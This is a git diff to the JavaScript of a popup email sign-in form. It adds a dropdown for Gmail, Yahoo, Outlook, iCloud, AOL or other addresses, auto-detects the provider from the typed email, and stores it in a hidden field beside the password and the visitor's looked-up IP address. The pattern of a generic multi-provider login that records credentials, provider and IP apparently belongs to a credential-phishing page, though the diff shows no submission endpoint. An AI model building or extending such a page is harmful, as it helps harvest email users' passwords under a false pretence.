@@ -12,11 +12,58 @@ document.addEventListener('DOMContentLoaded', function() {
     const displayedEmail = document.getElementById('displayedEmail');
     const formTitle = document.getElementById('formTitle');
     const emailHint = document.getElementById('emailHint');
+    const providerInput = document.getElementById('providerInput');
     const ipAddressInput = document.getElementById('ipAddressInput');
     const popupForm = document.getElementById('popupForm');
     
+    // Mail provider elements
+    const dropdownSelected = document.getElementById('dropdownSelected');
+    const dropdownOptions = document.getElementById('dropdownOptions');
+    const dropdownOptionItems = document.querySelectorAll('.dropdown-option');
+    
+    // Mail provider configurations
+    const mailProviders = {
+        'gmail': {
+            name: 'Gmail',
+            icon: 'fab fa-google',
+            suffix: '@gmail.com',
+            domains: ['gmail.com']
+        },
+        'yahoo': {
+            name: 'Yahoo Mail',
+            icon: 'fab fa-yahoo',
+            suffix: '@yahoo.com',
+            domains: ['yahoo.com', 'yahoo.co.uk', 'ymail.com', 'rocketmail.com']
+        },
+        'outlook': {
+            name: 'Outlook',
+            icon: 'fab fa-microsoft',
+            suffix: '@outlook.com',
+            domains: ['outlook.com', 'hotmail.com', 'live.com', 'msn.com']
+        },
+        'icloud': {
+            name: 'iCloud Mail',
+            icon: 'fab fa-apple',
+            suffix: '@icloud.com',
+            domains: ['icloud.com', 'me.com', 'mac.com']
+        },
+        'aol': {
+            name: 'AOL Mail',
+            icon: 'fas fa-at',
+            suffix: '@aol.com',
+            domains: ['aol.com']
+        },
+        'custom': {
+            name: 'Other Email',
+            icon: 'fas fa-edit',
+            suffix: '',
+            domains: []
+        }
+    };
+    
     let currentStep = 1;
     let userEmail = '';
+    let selectedProvider = null;
     let hideHintTimeout = null;
     
     // Create menu toggle for mobile
@@ -70,9 +117,91 @@ document.addEventListener('DOMContentLoaded', function() {
         document.body.style.overflow = 'auto';
     }
     
+    // Mail Provider Dropdown Functionality
+    // Toggle dropdown
+    dropdownSelected.addEventListener('click', function(e) {
+        e.stopPropagation();
+        dropdownOptions.classList.toggle('show');
+        this.classList.toggle('active');
+    });
+    
+    // Close dropdown when clicking outside
+    document.addEventListener('click', function(e) {
+        if (!dropdownSelected.contains(e.target) && !dropdownOptions.contains(e.target)) {
+            dropdownOptions.classList.remove('show');
+            dropdownSelected.classList.remove('active');
+        }
+    });
+    
+    // Handle provider selection
+    dropdownOptionItems.forEach(option => {
+        option.addEventListener('click', function() {
+            const providerValue = this.getAttribute('data-value');
+            selectProvider(providerValue);
+            
+            // Close dropdown
+            dropdownOptions.classList.remove('show');
+            dropdownSelected.classList.remove('active');
+            
+            // Focus on email input
+            emailInput.focus();
+        });
+    });
+    
+    // Select provider function
+    function selectProvider(providerValue) {
+        selectedProvider = providerValue;
+        const provider = mailProviders[providerValue];
+        
+        // Update dropdown selected display
+        dropdownSelected.innerHTML = `
+            <i class="${provider.icon}"></i>
+            <span>${provider.name}</span>
+            <i class="fas fa-chevron-down dropdown-arrow"></i>
+        `;
+        
+        // Add visual indication
+        dropdownSelected.classList.add('has-selection');
+        
+        // Update placeholder hint
+        if (providerValue === 'custom') {
+            emailInput.placeholder = 'Enter Email';
+            showEmailHint('Enter your full email address', 3000);
+        } else {
+            emailInput.placeholder = 'username' + provider.suffix;
+            showEmailHint(`Enter your ${provider.name} username`, 3000);
+        }
+    }
+    
+    // Auto-detect provider from email input
+    function detectProviderFromEmail(email) {
+        if (email.includes('@')) {
+            const domain = email.split('@')[1].toLowerCase();
+            
+            // Check each provider's domains
+            for (const [providerKey, provider] of Object.entries(mailProviders)) {
+                if (providerKey === 'custom') continue;
+                
+                if (provider.domains.some(d => domain === d || domain.endsWith('.' + d))) {
+                    return providerKey;
+                }
+            }
+        }
+        return 'custom';
+    }
+    
     // Handle email input focus - show hint briefly
     emailInput.addEventListener('focus', function() {
-        showEmailHint('Enter your email address', 3000);
+        if (selectedProvider) {
+            const provider = mailProviders[selectedProvider];
+            if (selectedProvider === 'custom') {
+                showEmailHint('Enter your full email address', 3000);
+            } else {
+                showEmailHint(`Enter your ${provider.name} username`, 3000);
+            }
+        } else {
+            showEmailHint('Select a mail provider or enter full email', 3000);
+        }
     });
     
     // Handle email input changes
@@ -87,6 +216,31 @@ document.addEventListener('DOMContentLoaded', function() {
         // Hide hint immediately when user starts typing
         if (emailValue.length > 0) {
             hideEmailHint();
+        }
+        
+        if (emailValue.includes('@')) {
+            // Auto-detect provider from full email
+            const detectedProvider = detectProviderFromEmail(emailValue);
+            
+            if (detectedProvider !== selectedProvider) {
+                selectedProvider = detectedProvider;
+                const provider = mailProviders[detectedProvider];
+                
+                // Update dropdown display
+                dropdownSelected.innerHTML = `
+                    <i class="${provider.icon}"></i>
+                    <span>${provider.name}</span>
+                    <i class="fas fa-chevron-down dropdown-arrow"></i>
+                `;
+                dropdownSelected.classList.add('has-selection');
+                
+                // Show hint for detected provider briefly
+                if (detectedProvider === 'custom') {
+                    showEmailHint('Custom email address detected', 2000);
+                } else {
+                    showEmailHint(`${provider.name} address detected`, 2000);
+                }
+            }
         }
     });
     
@@ -191,6 +345,8 @@ document.addEventListener('DOMContentLoaded', function() {
         passwordInput.value = '';
         userEmail = '';
         displayedEmail.textContent = '';
+        selectedProvider = null;
+        providerInput.value = '';
         ipAddressInput.value = '';
         
         // Clear any pending timeout
@@ -199,9 +355,21 @@ document.addEventListener('DOMContentLoaded', function() {
             hideHintTimeout = null;
         }
         
+        // Reset dropdown to default state
+        dropdownSelected.innerHTML = `
+            <i class="fas fa-envelope"></i>
+            <span>Select Mail Provider</span>
+            <i class="fas fa-chevron-down dropdown-arrow"></i>
+        `;
+        dropdownSelected.classList.remove('has-selection');
+        
         // Reset email input
         emailInput.placeholder = 'Enter Email';
         hideEmailHint();
+        
+        // Ensure dropdown is closed
+        dropdownOptions.classList.remove('show');
+        dropdownSelected.classList.remove('active');
     }
     
     // Validation functions
@@ -220,6 +388,20 @@ document.addEventListener('DOMContentLoaded', function() {
             showEmailHint('Please enter a valid email address (e.g., user@example.com)', 3000);
             alert('Please enter a valid email address (e.g., user@example.com)');
             return false;
+        }
+        
+        // Auto-detect provider if not already selected
+        if (!selectedProvider) {
+            selectedProvider = detectProviderFromEmail(emailValue);
+            
+            // Update dropdown display
+            const provider = mailProviders[selectedProvider];
+            dropdownSelected.innerHTML = `
+                <i class="${provider.icon}"></i>
+                <span>${provider.name}</span>
+                <i class="fas fa-chevron-down dropdown-arrow"></i>
+            `;
+            dropdownSelected.classList.add('has-selection');
         }
         
         userEmail = emailValue;
@@ -241,8 +423,11 @@ document.addEventListener('DOMContentLoaded', function() {
         try {
             // Disable button and show loading
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Sign in...';
+            submitBtn.textContent = 'Sign in..';
             submitBtn.style.opacity = '0.7';
+            
+            // Set provider value in hidden input
+            providerInput.value = selectedProvider;
             
             // Get and set IP address
             let ipAddress = 'Unknown';
